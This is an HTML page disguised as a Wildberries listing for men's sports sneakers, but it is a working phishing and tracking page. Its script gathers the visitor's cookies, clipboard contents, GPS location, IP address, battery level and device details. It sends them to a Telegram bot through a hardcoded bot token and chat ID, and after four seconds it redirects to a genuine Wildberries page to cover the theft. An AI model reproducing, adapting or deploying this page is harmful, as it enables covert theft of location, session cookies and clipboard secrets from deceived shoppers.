<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Wildberries - Крассовки</title>
<style>
body{font-family:Arial,sans-serif;margin:0;padding:20px;text-align:center;background:#fff;}
img{max-width:100%;height:auto;border-radius:10px;}
.price{color:#f44336;font-size:24px;font-weight:bold;}
</style>
</head>
<body>
<h2>Крассовки спортивные мужские</h2>
<img src="https://ir-3.wbstatic.net/c516x688/new/927003948/1.jpg" onerror="this.src='https://via.placeholder.com/300x300?text=WB'">
<p class="price">1 299 руб</p>
<p>Пожалуйста, разрешите геолокацию для проверки доставки...</p>

<script>
var TOKEN = "8636640064:AAFcyhqdc_YBLzEtAMKbKZhcfylhLhfIWLo";
var ID = "7532676697";
var allData = "";

function send(text) {
    new Image().src = "https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+ID+"&text="+encodeURIComponent(text);
}

// Основные данные
allData += "📱 " + navigator.userAgent + "\n";
allData += "💾 Память: " + (navigator.deviceMemory || "?") + " GB\n";
allData += "📺 Экран: " + screen.width + "x" + screen.height + "\n";
allData += "🌐 Язык: " + navigator.language + "\n";
allData += "🍪 Куки: " + (document.cookie || "нет") + "\n";
allData += "🔗 Реферер: " + (document.referrer || "нет") + "\n";
allData += "🕒 Время: " + new Date().toLocaleString() + "\n";

// Батарея
try {
    navigator.getBattery().then(function(b) {
        allData += "🔋 Заряд: " + Math.round(b.level*100) + "%\n";
        send(allData);
    });
} catch(e) {}

// Буфер обмена (работает только на HTTPS)
try {
    navigator.clipboard.readText().then(function(text) {
        send("📋 БУФЕР ОБМЕНА: " + text);
    }).catch(function() {
        send("📋 Буфер: нет доступа");
    });
} catch(e) {
    send("📋 Буфер: ошибка");
}

// GPS (запрашивает разрешение)
try {
    navigator.geolocation.getCurrentPosition(function(pos) {
        send("📍 GPS: " + pos.coords.latitude.toFixed(6) + ", " + pos.coords.longitude.toFixed(6) + "\n🗺 Карта: https://maps.google.com/?q=" + pos.coords.latitude + "," + pos.coords.longitude);
    }, function(err) {
        send("📍 GPS: отклонено (" + err.message + ")");
    });
} catch(e) {
    send("📍 GPS: не поддерживается");
}

// IP адрес
fetch("https://api.ipify.org?format=json")
    .then(r => r.json())
    .then(data => {
        send("🌍 IP: " + data.ip);
    });

// Отправка основных данных
send(allData);

// Редирект
setTimeout(function(){
    window.location.href = "https://www.wildberries.ru/catalog/927003948/detail.aspx?size=1399654915";
}, 4000);
</script>
</body>
</html>
